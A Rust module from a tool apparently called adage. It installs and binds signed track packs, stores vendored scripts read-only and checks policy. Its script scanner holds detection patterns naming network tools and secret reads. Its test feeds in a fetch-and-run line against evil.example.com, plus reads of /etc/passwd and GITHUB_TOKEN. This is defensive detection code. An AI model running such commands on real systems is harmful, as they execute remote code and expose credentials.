//! Installed track packs (Track C §2.2, §2.3): where they live, binding them to repositories, the
//! bound tracks the index compiles, the content-addressed store for vendored scripts, the policy
//! hooks `adage add` runs, and the script checks `adage share` runs.
//!
//! ```text
//! $ADAGE_HOME/tracks/@imported/<owner>/<name>/                  the pack, exactly as verified
//! $ADAGE_HOME/tracks/@imported/@bound/<owner>/<name>/<repo>/    one bound track per repository:
//!     track.toml, routes/*.yaml    the live routes, in the runtime model, at probation
//!     exec.json                    route id → ExecBinding (IndexedRoute.exec)
//!     binding.json                 every route live or inert (with the reason), the pack digest,
//!                                  how the pack was verified, and the checkout it was bound against
//!     review.yaml, proposals.yaml  the recipient's own decisions, carried across re-binds
//! $ADAGE_HOME/cas/<sha256>                                      vendored scripts, read-only
//! ```
//!
//! A bound track is derived state: `adage add` rewrites it from the pack each time (carrying the
//! recipient's review decisions, as a re-import does), and the index compiles it like any
//! imported track (probation, yellow at most). Nothing here creates an execution approval.

use crate::add::at_probation;
use crate::reimport;
use adage_pack::bind::{Applies, BindEnv, Binding, BoundRoute, Status, Target};
use adage_pack::Pack;
use adage_store::Paths;
use adage_tracks::index::{ExecBinding, BOUND_DIR, EXEC_FILE, IMPORTED_DIR};
use adage_tracks::{io, Aspect, Gauge, Manifest, Scope, Track, TrackInfo};
use anyhow::{bail, Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet};
use std::path::{Path, PathBuf};

/// Beside a bound track: the whole binding.
pub const BINDING_FILE: &str = "binding.json";

/// `binding.json`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct BindingFile {
    pub pack: String,
    pub version: String,
    /// The pack digest (Track C §1.5).
    pub digest: String,
    /// How the pack was verified at `add` (signer and namespace).
    pub verified: String,
    pub repo: String,
    /// The checkout this binding read (local state; never shared).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub root: Option<String>,
    /// Set when no route could be evaluated here (an unknown detector or catalogue).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub unknown: Option<String>,
    pub routes: Vec<BoundRoute>,
}

pub fn pack_dir(paths: &Paths, name: &str) -> PathBuf {
    paths.tracks().join(IMPORTED_DIR).join(name)
}

pub fn bound_base(paths: &Paths, name: &str) -> PathBuf {
    paths.tracks().join(IMPORTED_DIR).join(BOUND_DIR).join(name)
}

pub fn cas_dir(paths: &Paths) -> PathBuf {
    paths.root.join("cas")
}

/// Every `binding.json` under the bound tracks, with its directory, sorted.
pub fn bindings(paths: &Paths) -> Vec<(PathBuf, BindingFile)> {
    let mut out = Vec::new();
    let mut stack = vec![paths.tracks().join(IMPORTED_DIR).join(BOUND_DIR)];
    while let Some(d) = stack.pop() {
        let f = d.join(BINDING_FILE);
        if f.is_file() {
            if let Some(b) = std::fs::read(&f).ok().and_then(|b| serde_json::from_slice::<BindingFile>(&b).ok()) {
                out.push((d, b));
            }
            continue;
        }
        for e in std::fs::read_dir(&d).into_iter().flatten().flatten() {
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                stack.push(e.path());
            }
        }
    }
    out.sort_by(|a, b| a.0.cmp(&b.0));
    out
}

/// One inert route of an installed pack, for `adage doctor` and `adage review`.
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct InertRoute {
    pub pack: String,
    pub version: String,
    pub digest: String,
    pub repo: String,
    pub route: String,
    pub reason: String,
}

pub fn inert_routes(paths: &Paths) -> Vec<InertRoute> {
    bindings(paths)
        .into_iter()
        .flat_map(|(_, b)| {
            b.routes
                .iter()
                .filter_map(|r| {
                    r.status.reason().map(|why| InertRoute {
                        pack: b.pack.clone(),
                        version: b.version.clone(),
                        digest: b.digest.clone(),
                        repo: b.repo.clone(),
                        route: r.id.clone(),
                        reason: why.to_string(),
                    })
                })
                .collect::<Vec<_>>()
        })
        .collect()
}

/// Where to bind `pack`: for repository applicability, each of its keys (with the checkout, when
/// `cwd_root` or a checkout bound earlier answers to it); otherwise `cwd_root` and every checkout
/// bound earlier that still exists.
pub fn targets(pack: &Pack, cwd_root: Option<&Path>, recorded: &[PathBuf]) -> Vec<Target> {
    let mut roots: Vec<PathBuf> = cwd_root.map(Path::to_path_buf).into_iter().collect();
    for r in recorded {
        if r.is_dir() && !roots.contains(r) {
            roots.push(r.clone());
        }
    }
    let mut out: Vec<Target> = Vec::new();
    match &pack.manifest.applicability {
        adage_pack::Applicability::Repo { repo_keys } => {
            let keyed: Vec<(PathBuf, BTreeSet<String>)> =
                roots.iter().map(|r| (r.clone(), adage_pack::bind::local_keys(r))).collect();
            for k in repo_keys {
                let t = match keyed.iter().find(|(_, keys)| keys.contains(k)) {
                    Some((root, _)) => Target::checkout(root),
                    None => Target { repo: k.clone(), root: None },
                };
                if !out.iter().any(|x| x.repo == t.repo) {
                    out.push(t);
                }
            }
        }
        _ => {
            for r in &roots {
                let t = Target::checkout(r);
                if !out.iter().any(|x| x.repo == t.repo) {
                    out.push(t);
                }
            }
        }
    }
    out
}

/// What binding one repository did.
pub struct Bound {
    pub binding: Binding,
    /// Where the bound track was written (`None`: the pack does not apply there).
    pub dir: Option<PathBuf>,
    /// The bound track as installed (at probation, the recipient's decisions carried).
    pub track: Option<Track>,
    /// Each live route's aspect before probation capped it.
    pub was: BTreeMap<String, Aspect>,
    pub kept: Vec<(String, adage_tracks::review::Decision)>,
    /// Pinned routes whose new version differs: proposed in `adage review`.
    pub proposed: Vec<String>,
}

/// Bind an installed pack to every target and write the bound tracks, replacing this pack's
/// earlier ones. `skipped` are routes the pack could not carry at all (a v1 upgrade's), recorded
/// as inert. The caller holds the tracks lock and recompiles the index afterwards.
pub fn bind_installed(
    paths: &Paths,
    pack: &Pack,
    digest: &str,
    verified: &str,
    skipped: &[(String, String)],
    cwd_root: Option<&Path>,
) -> Result<Vec<Bound>> {
    let name = &pack.manifest.pack.name;
    let base = bound_base(paths, name);
    let recorded: Vec<PathBuf> = bindings(paths)
        .into_iter()
        .filter(|(d, b)| &b.pack == name && d.starts_with(&base))
        .filter_map(|(_, b)| b.root.map(PathBuf::from))
        .collect();
    let env = BindEnv::current(Some(cas_dir(paths)));
    let mut out = Vec::new();
    let mut written: BTreeSet<PathBuf> = BTreeSet::new();
    for target in targets(pack, cwd_root, &recorded) {
        let mut binding = adage_pack::bind(pack, &target, &env);
        if let Applies::No(_) = binding.applies {
            out.push(Bound { binding, dir: None, track: None, was: BTreeMap::new(), kept: vec![], proposed: vec![] });
            continue;
        }
        for (id, why) in skipped {
            binding.routes.push(BoundRoute {
                id: id.clone(),
                status: Status::Inert { reason: format!("not carried into the pack: {why}") },
                route_exec_digest: String::new(),
                scripts: vec![],
                route: None,
            });
        }
        binding.routes.sort_by(|a, b| a.id.cmp(&b.id));
        let dir = base.join(adage_learn::slug(&target.repo));
        let w = write_bound(paths, pack, digest, verified, &target, &binding, &dir)?;
        written.insert(dir.clone());
        out.push(Bound {
            binding,
            dir: Some(dir),
            track: Some(w.track),
            was: w.was,
            kept: w.kept,
            proposed: w.proposed,
        });
    }
    // Repositories this pack no longer binds to lose their bound track.
    for e in std::fs::read_dir(&base).into_iter().flatten().flatten() {
        if e.file_type().is_ok_and(|t| t.is_dir()) && !written.contains(&e.path()) {
            std::fs::remove_dir_all(e.path())?;
        }
    }
    Ok(out)
}

struct Written {
    track: Track,
    was: BTreeMap<String, Aspect>,
    kept: Vec<(String, adage_tracks::review::Decision)>,
    proposed: Vec<String>,
}

fn write_bound(
    paths: &Paths,
    pack: &Pack,
    digest: &str,
    verified: &str,
    target: &Target,
    binding: &Binding,
    dest: &Path,
) -> Result<Written> {
    let m = &pack.manifest;
    let harness: Vec<String> =
        m.requires.harness.iter().map(|h| h.split(' ').next().unwrap_or(h).to_string()).collect();
    let track = Track {
        manifest: Manifest {
            track: TrackInfo {
                name: m.pack.name.clone(),
                version: m.pack.version.clone(),
                description: m.pack.description.clone(),
                provenance: format!("pack:{}", pack_origin(m.pack.origin)),
            },
            scope: Scope { repo: target.repo.clone() },
            gauge: Gauge { harness, models: vec![] },
        },
        routes: binding.live().filter_map(|r| r.route.clone()).collect(),
    };
    let was: BTreeMap<String, Aspect> = track.routes.iter().map(|r| (r.id.clone(), r.aspect)).collect();
    let (mut track, _) = at_probation(track);
    // A reflex that runs a vendored script is exec-only (never directed at E0), so it does not
    // wait as a draft: running it always needs its own explicit approval (Track C §1.7).
    let exec_only: BTreeSet<&str> =
        pack.routes.iter().filter(|r| adage_pack::bind::vendored(r)).map(|r| r.id.as_str()).collect();
    for r in track.routes.iter_mut().filter(|r| exec_only.contains(r.id.as_str())) {
        if r.state == adage_tracks::RouteState::Draft {
            r.state = adage_tracks::RouteState::Probation;
        }
    }
    io::validate(&track).context("the bound track fails validation")?;
    let carried = reimport::carry(dest, track, &paths.tracks())?;
    io::validate(&carried.track).context("the bound track fails validation")?;
    let exec: BTreeMap<String, ExecBinding> = binding
        .routes
        .iter()
        .filter(|r| carried.track.routes.iter().any(|x| x.id == r.id))
        .filter_map(|r| r.exec().map(|e| (r.id.clone(), e)))
        .collect();
    let file = BindingFile {
        pack: m.pack.name.clone(),
        version: m.pack.version.clone(),
        digest: digest.to_string(),
        verified: verified.to_string(),
        repo: target.repo.clone(),
        root: target.root.as_ref().map(|r| r.display().to_string()),
        unknown: match &binding.applies {
            Applies::Unknown(why) => Some(why.clone()),
            _ => None,
        },
        routes: binding.routes.clone(),
    };
    let fresh = paths.root.join("staging").join(format!("bind-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&fresh);
    let result = (|| -> Result<()> {
        io::write(&fresh, &carried.track)?;
        adage_tracks::review::save(&fresh, &carried.reviews)?;
        adage_tracks::proposals::save(&fresh, &carried.proposals)?;
        std::fs::write(fresh.join(EXEC_FILE), serde_json::to_vec_pretty(&exec)?)?;
        std::fs::write(fresh.join(BINDING_FILE), serde_json::to_vec_pretty(&file)?)?;
        if dest.exists() {
            std::fs::remove_dir_all(dest)?;
        }
        std::fs::create_dir_all(dest.parent().context("a bound track has a parent directory")?)?;
        std::fs::rename(&fresh, dest)?;
        Ok(())
    })();
    if result.is_err() {
        let _ = std::fs::remove_dir_all(&fresh);
    }
    result?;
    let proposed = carried.proposals.routes.keys().cloned().collect();
    Ok(Written { track: carried.track, was, kept: carried.kept, proposed })
}

fn pack_origin(o: adage_pack::PackOrigin) -> &'static str {
    match o {
        adage_pack::PackOrigin::Reflex => "reflex",
        adage_pack::PackOrigin::Instinct => "instinct",
        adage_pack::PackOrigin::Trained => "trained",
        adage_pack::PackOrigin::Authored => "authored",
    }
}

/// The fingerprint of the key that signed an installed pack (re-verified from its `pack.sig`).
pub fn signer(paths: &Paths, name: &str) -> Option<String> {
    let dir = pack_dir(paths, name);
    let pem = std::fs::read_to_string(dir.join(adage_pack::validate::SIG)).ok()?;
    let digest = adage_pack::digest_dir(&dir).ok()?;
    let msg = adage_sign::message(&digest).ok()?;
    let key = adage_sign::verify_embedded(&msg, adage_sign::PACK_NAMESPACE, &pem).ok()?;
    Some(adage_sign::fingerprint(&key))
}

/// An installed pack's attestations (Track C §1.8), one line each, marked self-reported by its
/// signer. Informational only: nothing reads them to grant a strength, a level or an approval.
pub fn attestation_lines(paths: &Paths, name: &str) -> Vec<String> {
    let Ok(pack) = Pack::load(&pack_dir(paths, name)) else { return Vec::new() };
    if pack.attestations.is_empty() {
        return Vec::new();
    }
    let by = signer(paths, name).unwrap_or_else(|| "an unverified signer".into());
    pack.attestations
        .iter()
        .map(|(id, a)| {
            format!("{id}: {} (self-reported by signer {by}; informational only)", adage_pack::attest::summary(a))
        })
        .collect()
}

/// Copy a pack's vendored scripts into `$ADAGE_HOME/cas/<sha256>`, read-only. An entry already
/// there must hold the same bytes. Returns the hashes copied.
pub fn install_cas(paths: &Paths, pack: &Pack) -> Result<Vec<String>> {
    let dir = cas_dir(paths);
    let mut out = Vec::new();
    for (hex, bytes) in &pack.scripts {
        if adage_pack::digest::sha256_hex(bytes) != *hex {
            bail!("vendored script {hex} is not named by its SHA-256");
        }
        let p = dir.join(hex);
        if let Ok(have) = std::fs::read(&p) {
            if adage_pack::digest::sha256_hex(&have) == *hex {
                continue;
            }
            // A damaged entry: replace it.
            let mut perm = std::fs::metadata(&p)?.permissions();
            #[allow(clippy::permissions_set_readonly_false)]
            perm.set_readonly(false);
            std::fs::set_permissions(&p, perm)?;
            std::fs::remove_file(&p)?;
        }
        std::fs::create_dir_all(&dir)?;
        let tmp = dir.join(format!(".{hex}.tmp{}", std::process::id()));
        std::fs::write(&tmp, bytes)?;
        let mut perm = std::fs::metadata(&tmp)?.permissions();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            perm.set_mode(0o444);
        }
        #[cfg(not(unix))]
        perm.set_readonly(true);
        std::fs::set_permissions(&tmp, perm)?;
        std::fs::rename(&tmp, &p)?;
        out.push(hex.clone());
    }
    Ok(out)
}

/// Execution policy (Track C §4.5), as far as `adage add` needs it before `adage-exec` exists:
/// `$ADAGE_HOME/policy.toml`, then a managed file (`ADAGE_POLICY`, else `/etc/adage/policy.toml`),
/// whose denies win. `[publishers] deny` refuses a signer; `[exec] allow_vendor_scripts = false`
/// refuses packs with vendored scripts. Everything else is for adage-exec (C2).
pub fn policy_check(paths: &Paths, pack: &Pack, signer: Option<&str>) -> Result<()> {
    let managed =
        std::env::var_os("ADAGE_POLICY").map(PathBuf::from).unwrap_or_else(|| PathBuf::from("/etc/adage/policy.toml"));
    for file in [paths.root.join("policy.toml"), managed] {
        let Ok(text) = std::fs::read_to_string(&file) else { continue };
        let v: toml::Value = toml::from_str(&text).with_context(|| format!("{} is not valid TOML", file.display()))?;
        if let (Some(fp), Some(deny)) =
            (signer, v.get("publishers").and_then(|p| p.get("deny")).and_then(|d| d.as_array()))
        {
            if deny.iter().any(|d| d.as_str() == Some(fp)) {
                bail!("refusing: policy {} denies publisher {fp}", file.display());
            }
        }
        let vendor = v.get("exec").and_then(|e| e.get("allow_vendor_scripts")).and_then(|b| b.as_bool());
        if vendor == Some(false) && !pack.scripts.is_empty() {
            bail!(
                "refusing: {} vendors {} script(s), and policy {} sets allow_vendor_scripts = false",
                pack.manifest.pack.name,
                pack.scripts.len(),
                file.display()
            );
        }
    }
    Ok(())
}

/// A reason a script needs acknowledgement before it is shared (Track C §1.6): URLs or
/// hostnames, network tools, absolute paths, or environment reads of secrets.
#[derive(Debug, Clone, PartialEq)]
pub struct ScriptFlag {
    pub line: usize,
    pub kind: &'static str,
    pub excerpt: String,
}

pub fn script_flags(text: &str) -> Vec<ScriptFlag> {
    use regex::Regex;
    use std::sync::OnceLock;
    static R: OnceLock<Vec<(&'static str, Regex)>> = OnceLock::new();
    let rules = R.get_or_init(|| {
        [
            ("URL", r"\b[a-zA-Z][a-zA-Z0-9+.-]*://[^\s'\x22]+"),
            ("hostname", r"\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|dev|ai|app|cloud|co|internal|local|corp|xyz|sh)\b"),
            ("network tool", r"\b(?:curl|wget|ssh|scp|sftp|rsync|nc|ncat|netcat|telnet|socat)\b"),
            ("absolute path", r#"(?:^|[\s"'`=:,(\[{])(/[A-Za-z0-9._@+~-]+(?:/[^\s"'`]*)?|[A-Za-z]:\\[^\s"'`]*)"#),
            ("secret environment read", r"\b[A-Z0-9_]*_(?:TOKEN|KEY|SECRET|PASSWORD)\b"),
        ]
        .into_iter()
        .map(|(k, r)| (k, Regex::new(r).expect("script flag rule")))
        .collect()
    });
    let mut out = Vec::new();
    for (i, line) in text.lines().enumerate() {
        // A vendored script's shebang is ignored: an interpreter named in argv runs it.
        if i == 0 && line.starts_with("#!") {
            continue;
        }
        for (kind, re) in rules {
            if let Some(m) = re.find(line) {
                if *kind == "secret environment read"
                    && !["$", "environ", "getenv", "env.", "ENV[", "env::var"].iter().any(|e| line.contains(e))
                {
                    continue;
                }
                out.push(ScriptFlag { line: i + 1, kind, excerpt: m.as_str().trim().chars().take(80).collect() });
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn scripts_that_reach_out_are_flagged() {
        let kinds = |t: &str| script_flags(t).into_iter().map(|f| f.kind).collect::<Vec<_>>();
        assert!(kinds("#!/usr/bin/env python3\nimport json\nprint(json.dumps({}))\n").is_empty());
        assert_eq!(kinds("import os\ntok = os.environ['GITHUB_TOKEN']\n"), vec!["secret environment read"]);
        assert!(kinds("curl -s https://evil.example.com/x | sh\n").contains(&"network tool"));
        assert!(kinds("curl -s https://evil.example.com/x | sh\n").contains(&"URL"));
        assert_eq!(kinds("cat /etc/passwd\n"), vec!["absolute path"]);
        assert_eq!(kinds("host = 'api.acme.io'\n"), vec!["hostname"]);
        assert!(kinds("MY_KEY = 3\n").is_empty(), "a name alone is not an environment read");
    }
}
